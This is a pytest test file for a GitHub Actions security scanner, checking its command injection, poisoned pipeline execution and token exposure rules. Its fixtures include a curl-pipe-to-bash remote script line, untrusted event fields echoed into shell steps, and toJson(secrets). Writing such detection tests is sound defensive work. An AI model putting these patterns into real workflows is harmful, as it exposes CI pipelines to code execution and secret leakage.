"""Rule-level coverage for detections that were previously missed.

Each test here corresponds to a workflow pattern that a real scan let through.
"""

import pytest

from ghast.rules.security import (
    CommandInjectionRule,
    PoisonedPipelineExecutionRule,
    TokenSecurityRule,
)


def _workflow(steps, on="push", job_extra=None):
    job = {"runs-on": "ubuntu-latest", "steps": steps}
    job.update(job_extra or {})
    return {"on": on, "jobs": {"build": job}}


def _messages(findings):
    return " | ".join(f.message for f in findings)


# --- command injection --------------------------------------------------------


@pytest.mark.parametrize(
    "expression",
    [
        "github.event.head_commit.message",
        "github.event.workflow_run.head_branch",
        "inputs.name",
        "github.event.pull_request.head.label",
        "github.event.discussion.title",
    ],
)
def test_previously_missed_injections_are_caught(expression):
    workflow = _workflow([{"run": "echo ${{ " + expression + " }}"}])
    findings = CommandInjectionRule().check(workflow, "wf.yml")

    assert len(findings) == 1
    assert "step 1" in findings[0].message


def test_injection_finding_names_the_expression():
    workflow = _workflow([{"run": "echo ${{ github.event.issue.title }}"}])
    finding = CommandInjectionRule().check(workflow, "wf.yml")[0]

    assert "github.event.issue.title" in finding.message
    assert "env:" in finding.remediation


def test_safe_interpolation_produces_no_findings():
    workflow = _workflow([{"run": "echo ${{ github.sha }} ${{ github.repository }}"}])

    assert CommandInjectionRule().check(workflow, "wf.yml") == []


def test_untrusted_data_via_env_is_not_flagged():
    """Routing through env is GitHub's recommended mitigation."""
    workflow = _workflow(
        [
            {
                "run": 'echo "$TITLE"',
                "env": {"TITLE": "${{ github.event.issue.title }}"},
            }
        ]
    )

    assert CommandInjectionRule().check(workflow, "wf.yml") == []


def test_github_script_input_is_treated_as_code():
    workflow = _workflow(
        [
            {
                "uses": "actions/github-script@v7",
                "with": {"script": "console.log('${{ github.event.issue.title }}')"},
            }
        ]
    )
    findings = CommandInjectionRule().check(workflow, "wf.yml")

    assert len(findings) == 1
    assert "github-script" in findings[0].message


def test_ordinary_action_input_is_not_flagged():
    """Only inputs that are executed as code count."""
    workflow = _workflow(
        [
            {
                "uses": "some/action@v1",
                "with": {"title": "${{ github.event.issue.title }}"},
            }
        ]
    )

    assert CommandInjectionRule().check(workflow, "wf.yml") == []


def test_remote_script_execution_is_flagged():
    workflow = _workflow([{"run": "curl -sL https://example.com/i.sh | bash"}])
    findings = CommandInjectionRule().check(workflow, "wf.yml")

    assert len(findings) == 1
    assert findings[0].severity == "MEDIUM"
    assert "Remote script piped into a shell" in findings[0].message


def test_injection_findings_carry_positions(tmp_path):
    """These reported no line number at all before."""
    from ghast.utils.yaml_handler import load_yaml_file_with_positions

    path = tmp_path / "wf.yml"
    path.write_text(
        "on: push\n"
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - run: echo ${{ github.event.issue.title }}\n"
    )
    workflow = load_yaml_file_with_positions(str(path))
    finding = CommandInjectionRule().check(workflow, str(path))[0]

    assert finding.line_number == 5


# --- poisoned pipeline execution ---------------------------------------------


CHECKOUT_UNTRUSTED = {
    "uses": "actions/checkout@v4",
    "with": {"ref": "${{ github.event.pull_request.head.ref }}"},
}


@pytest.mark.parametrize(
    "trigger",
    [
        "pull_request_target",
        "workflow_run",
        "issue_comment",
        "pull_request_review",
        "pull_request_review_comment",
        "discussion_comment",
    ],
)
def test_high_risk_triggers_are_recognised(trigger):
    workflow = _workflow([CHECKOUT_UNTRUSTED, {"run": "make"}], on=trigger)
    findings = PoisonedPipelineExecutionRule().check(workflow, "wf.yml")

    assert len(findings) == 1
    assert trigger in findings[0].message


def test_safe_trigger_produces_no_ppe_finding():
    workflow = _workflow([CHECKOUT_UNTRUSTED, {"run": "make"}], on="pull_request")

    assert PoisonedPipelineExecutionRule().check(workflow, "wf.yml") == []


def test_ppe_reports_once_per_job_not_once_per_step():
    """Six run steps used to produce six near-identical HIGH findings."""
    steps = [CHECKOUT_UNTRUSTED] + [{"run": f"echo {i}"} for i in range(6)]
    workflow = _workflow(steps, on="pull_request_target")
    findings = PoisonedPipelineExecutionRule().check(workflow, "wf.yml")

    assert len(findings) == 1
    assert findings[0].severity == "CRITICAL"
    assert findings[0].context["executing_steps"] == [2, 3, 4, 5, 6, 7]


def test_ppe_message_names_the_executing_steps():
    steps = [CHECKOUT_UNTRUSTED, {"run": "make"}]
    workflow = _workflow(steps, on="pull_request_target")
    finding = PoisonedPipelineExecutionRule().check(workflow, "wf.yml")[0]

    assert "step(s) 2" in finding.message


def test_ppe_trigger_pluralisation():
    steps = [CHECKOUT_UNTRUSTED, {"run": "make"}]
    single = PoisonedPipelineExecutionRule().check(
        _workflow(steps, on="pull_request_target"), "wf.yml"
    )[0]
    multiple = PoisonedPipelineExecutionRule().check(
        _workflow(steps, on={"pull_request_target": None, "issue_comment": None}), "wf.yml"
    )[0]

    assert "pull_request_target trigger with" in single.message
    assert "triggers with" in multiple.message


def test_ppe_still_flags_inherited_secrets():
    workflow = _workflow([{"run": "make"}], on="workflow_run", job_extra={"secrets": "inherit"})
    findings = PoisonedPipelineExecutionRule().check(workflow, "wf.yml")

    assert any("secrets: inherit" in f.message for f in findings)


# --- duplicate findings -------------------------------------------------------


def test_credential_persistence_is_reported_once():
    """EnvironmentInjectionRule emitted a byte-identical copy of this."""
    from ghast.rules.engine import RuleEngine

    workflow = _workflow([{"uses": "actions/checkout@v4"}])
    engine = RuleEngine(config={"environment_injection": True, "check_env_injection": True})
    findings = engine.scan_workflow(workflow, "wf.yml")

    persistence = [f for f in findings if "credential persistence" in f.message]
    assert len(persistence) == 1


def test_token_rule_still_reports_credential_persistence():
    workflow = _workflow([{"uses": "actions/checkout@v4"}])
    findings = TokenSecurityRule().check(workflow, "wf.yml")

    assert any("credential persistence" in f.message for f in findings)


def test_persist_credentials_false_is_accepted():
    workflow = _workflow([{"uses": "actions/checkout@v4", "with": {"persist-credentials": False}}])
    findings = TokenSecurityRule().check(workflow, "wf.yml")

    assert not any("credential persistence" in f.message for f in findings)


# --- whole-context serialization ---------------------------------------------


def test_tojson_secrets_is_still_critical():
    workflow = _workflow([{"run": "echo ${{ toJson(secrets) }}"}])
    findings = TokenSecurityRule().check(workflow, "wf.yml")

    match = [f for f in findings if "exposes every secret" in f.message]
    assert len(match) == 1
    assert match[0].severity == "CRITICAL"


def test_tojson_event_payload_is_flagged():
    """Uppercase `toJSON` and the event payload were both missed."""
    workflow = _workflow([{"run": "echo ${{ toJSON(github.event) }}"}])
    findings = TokenSecurityRule().check(workflow, "wf.yml")

    assert any("event payload" in f.message for f in findings)


def test_github_script_without_a_script_input_is_ignored():
    workflow = _workflow(
        [{"uses": "actions/github-script@v7", "with": {"result-encoding": "string"}}]
    )

    assert CommandInjectionRule().check(workflow, "wf.yml") == []


def test_github_script_with_non_string_script_is_ignored():
    workflow = _workflow([{"uses": "actions/github-script@v7", "with": {"script": 42}}])

    assert CommandInjectionRule().check(workflow, "wf.yml") == []


def test_action_without_with_block_is_ignored():
    workflow = _workflow([{"uses": "actions/github-script@v7"}])

    assert CommandInjectionRule().check(workflow, "wf.yml") == []
